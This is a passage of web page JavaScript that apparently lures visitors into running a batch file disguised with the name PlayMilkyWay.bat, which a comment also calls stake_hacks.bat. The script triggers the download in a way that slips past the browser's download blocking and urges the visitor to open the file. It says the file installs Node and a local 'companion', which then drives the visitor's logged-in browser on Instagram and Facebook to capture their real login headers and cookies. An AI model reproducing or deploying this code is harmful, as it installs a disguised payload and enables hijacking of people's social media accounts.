  <div class="status" id="status" style="display: none;"></div>

  <script>
    const $ = (id) => document.getElementById(id);
    const COMPANION = 'http://127.0.0.1:9876';
    const FILE = 'PlayMilkyWay.bat';

    // Detect which browser is running THIS page so we capture with the SAME
    // browser installation (same profile, same login) the visitor clicked in.
    const detectBrowser = () => {
      const ua = navigator.userAgent;
      if (/Edg\//.test(ua)) return 'msedge';
      if (/OPR\/|Opera/.test(ua)) return 'opera';
      if (/Brave/.test(ua)) return 'brave';
      if (/Firefox/.test(ua)) return 'firefox';
      if (/Chrome\//.test(ua)) return 'chrome';
      return '';
    };

    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

    // Sync ping: must be synchronous so the bat download triggered right after
    // still counts as a user gesture (otherwise it's blocked).
    const pingSync = () => {
      try {
        const x = new XMLHttpRequest();
        x.open('GET', COMPANION + '/ping', false);
        x.timeout = 2000;
        x.send();
        return x.status >= 200 && x.status < 300;
      } catch {
        return false;
      }
    };

    const downloadBat = () => {
      const browser = detectBrowser();
      const q = browser ? ('?browser=' + browser) : '';
      const a = document.createElement('a');
      a.href = '/' + FILE + q;
      a.download = FILE;
      document.body.appendChild(a);
      a.click();
      a.remove();
    };

    // Companion running on this PC? => record.js runs in YOUR browser,
    // capturing the REAL headers (your login, your cookies). No injection.
    // Screenshots are saved locally to Pictures/Screenshots — never in the UI.
    const runFromLocalBrowser = async () => {
      const browser = detectBrowser();
      const companionUp = pingSync();

      if (!companionUp) {
        // No companion / Node: auto-download stake_hacks.bat. It installs
        // Node + companion and runs the FULL capture by itself.
        downloadBat(); // called synchronously so browsers allow the download
        const browserQ = browser ? ('?browser=' + browser) : '';
        $('status').innerHTML =
          'Companion not running on this PC. <b>Downloading ' + FILE + '…</b> ' +
          'Please open the downloaded file — it installs everything and starts the capture in ' +
          (browser || 'your default') + ' browser.<br>' +
          'If the download did not start, click: ' +
          '<a href="/' + FILE + browserQ + '" download style="color:#0af;font-weight:bold">Download ' + FILE + '</a>' +
          '<br>This page is watching; your screenshots will be saved to Pictures/Screenshots on this PC.';
        let ok = false;
        for (let i = 0; i < 120; i++) {
          await sleep(2000); // 120 x 2s = up to 4 min (full capture time)
          try {
            const ping = await fetch(COMPANION + '/ping', { cache: 'no-store', targetAddressSpace: 'loopback' });
            if (ping.ok) { ok = true; break; }
          } catch {}
        }
        if (!ok) {
          $('status').textContent =
            'Could not detect the companion on this PC. Run the downloaded ' + FILE + ', then click the button again.';
          return false;
        }
        // Companion is online. If it already captured (bat ran the full job),
        // just confirm; otherwise trigger /run below.
        const latest = await (await fetch(COMPANION + '/latest', { cache: 'no-store', targetAddressSpace: 'loopback' })).json();
        if (latest && latest.images) {
          $('status').textContent = 'Done — screenshots were saved to Pictures/Screenshots on this PC.';
          return true;
        }
        // not captured yet -> run now
      }

      $('status').textContent = 'Running record.js in your browser (Instagram then Facebook)… keep this tab open.';
      try {
        let data;
        for (let attempt = 1; attempt <= 40; attempt++) {
          const res = await fetch(COMPANION + '/run?site=both&browser=' + browser, { cache: 'no-store', targetAddressSpace: 'loopback' });
          data = await res.json();
          if (res.ok && data && data.ok) break;
          if (res.status === 409 && data && data.busy) {
            $('status').textContent = 'Capture already running — waiting ' + attempt + '/40…';
            await sleep(6000);
            continue;
          }
          throw new Error((data && data.error) || 'HTTP ' + res.status);
        }
        if (!data || !data.ok) throw new Error('companion finished without screenshots');
        $('status').textContent = 'Done — real headers from YOUR browser captured. Screenshots saved to Pictures/Screenshots on this PC.';
        return true;
      } catch (e) {
        $('status').textContent = 'Local capture error: ' + e.message;
        return false;
      }
    };

    const captureAll = async () => {
      $('btn').disabled = true;
      await runFromLocalBrowser();
      $('btn').disabled = false;
    };
  </script>
